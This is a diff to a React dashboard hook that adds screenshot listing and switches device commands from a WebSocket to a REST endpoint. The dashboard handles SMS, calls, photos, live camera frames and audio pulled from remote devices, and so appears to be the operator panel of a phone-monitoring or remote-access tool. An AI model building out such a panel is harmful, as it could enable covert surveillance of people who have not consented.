@@ -1,6 +1,6 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
 import { apiUrl, wsUrlForControl } from '../lib/helpers'
-import type { Device, DeviceHealth, HealthResponse, WsState, SMS, Call, Photo, CameraFrame, Recording } from '../types/dashboard'
+import type { Device, DeviceHealth, HealthResponse, WsState, SMS, Call, Photo, Screenshot, CameraFrame, Recording } from '../types/dashboard'
 
 export type AudioDataCallback = (data: ArrayBuffer, deviceId: string) => void
 export type WebRTCMessageCallback = (msg: Record<string, unknown>) => void
@@ -17,6 +17,7 @@ export function useDashboard(
   const [serverHealth, setServerHealth] = useState<HealthResponse | null>(null)
   const [feed, setFeed] = useState<string[]>([])
   const [photos, setPhotos] = useState<Photo[]>([])
+  const [screenshots, setScreenshots] = useState<Screenshot[]>([])
   const [recordings, setRecordings] = useState<Recording[]>([])
   const wsRef = useRef<WebSocket | null>(null)
   const reconnectTimerRef = useRef<number | null>(null)
@@ -55,15 +56,24 @@ export function useDashboard(
   }, [])
 
   const sendCommand = useCallback(
-    (cmd: string, extra: Record<string, unknown> = {}) => {
-      const ws = wsRef.current
+    async (cmd: string, extra: Record<string, unknown> = {}) => {
       const targetId = selectedDeviceId || devices[0]?.deviceId
-      if (!ws || ws.readyState !== WebSocket.OPEN || !targetId) {
-        addFeed(`Cannot send ${cmd}: no active control channel or device`)
+      if (!targetId) {
+        addFeed(`Cannot send ${cmd}: no target device`)
         return
       }
-      ws.send(JSON.stringify({ cmd, deviceId: targetId, ...extra }))
-      addFeed(`Sent ${cmd} to ${targetId}`)
+      addFeed(`Sending ${cmd}...`)
+      try {
+        const res = await fetch(apiUrl(`/devices/${targetId}/command`), {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ type: cmd, ...extra })
+        })
+        const result = await res.json()
+        addFeed(`Routed ${cmd} to ${targetId} via ${result.status}`)
+      } catch (err) {
+        addFeed(`Failed to send ${cmd}: ${err}`)
+      }
     },
     [addFeed, devices, selectedDeviceId],
   )
@@ -223,6 +233,20 @@ export function useDashboard(
             return
           }
 
+          // Handle screenshot saved
+          if (type === 'screenshot_saved') {
+            const ss: Screenshot = {
+              id: String(msg.filename || Date.now()),
+              filename: String(msg.filename || ''),
+              url: apiUrl(String(msg.url || '')),
+              size: Number(msg.size || 0),
+              timestamp: new Date(Number(msg.ts || Date.now())).toISOString(),
+            }
+            setScreenshots(prev => [ss, ...prev].slice(0, 50))
+            addFeed(`Screenshot saved: ${ss.filename}`)
+            return
+          }
+
           // Handle live camera frame
           if (type === 'camera_live_frame') {
             if (onCameraFrameRef.current) {
@@ -335,6 +359,27 @@ export function useDashboard(
 
     loadHealth()
     const id = window.setInterval(loadHealth, 15000)
+
+    const loadScreenshots = async () => {
+      try {
+        const res = await fetch(apiUrl('/screenshots'))
+        const list = await res.json()
+        if (!stopped && Array.isArray(list)) {
+          const mapped = list.map((item: any) => ({
+            id: item.name,
+            filename: item.name,
+            url: apiUrl(item.url),
+            size: item.size,
+            timestamp: new Date(item.ts).toISOString(),
+          }))
+          setScreenshots(mapped)
+        }
+      } catch (e) {
+        console.warn('Failed to fetch screenshots', e)
+      }
+    }
+    loadScreenshots()
+
     return () => {
       stopped = true
       clearInterval(id)
@@ -358,6 +403,7 @@ export function useDashboard(
     serverHealth,
     feed,
     photos,
+    screenshots,
     recordings,
     setSelectedDeviceId,
     sendCommand,
